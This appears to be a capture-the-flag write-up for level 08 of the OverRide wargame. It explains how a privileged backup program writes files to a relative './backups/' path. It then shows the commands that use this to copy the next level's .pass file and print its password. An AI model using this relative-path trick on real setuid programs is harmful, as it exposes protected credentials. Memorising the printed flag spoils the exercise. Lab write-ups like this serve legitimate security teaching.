# Level 08

<h3>source.c</h3>

```console
The source for this program is quite long
So i will not include it in this file, and can be check in the source.c directly if needed
```

<h3>Analysis</h3>

```console
level08@OverRide:~$ ./level08
Usage: ./level08 filename
```

At first try, this program require a filename to run, and after analyzing the code, we can find something interesting

```console
fs_2 = fopen(argv[1],"r");
if (fs_2 == 0) {
  printf("ERROR: Failed to open %s\n", argv[1]);
  exit(1);
}

strcpy(path, "./backups/");
strncat(path, argv[1], 99 - strlen(path));
fd = open(path, 193, 432);
if (fd < 0) {
  printf("ERROR: Failed to open %s%s\n", "./backups/", argv[1]);
  exit(1);
}
while(c = fgetc(fs_2)) {
  write(fd, &c, 1);
}
```

First it will try to open the file base on the filename that we input as `argv[1]`, next it will try to open `./backups/argv[1]` as well

If both file is available, it will then proceed to write char by char the content of file opened with `argv[1]` into `./backups/argv[1]`

Lets try with the file that we are most interested in `/home/users/level09/.pass`

```console
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

It seems the program faileld in opening `./backups//home/users/level09/.pass`, it could be possible that the folder `backups` is not created

Our goal this time will be to find a way to make this work

<h3>Exploit</h3>

Since the program need `backups` folder to exist, lets go to `/tmp` to create one!

```console
level08@OverRide:~$ cd /tmp
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09/     -> use option -p to create parent folder if needed
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass      -> use ~ as the path to user home, where the program level08 is located
level08@OverRide:/tmp$ cat ./backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```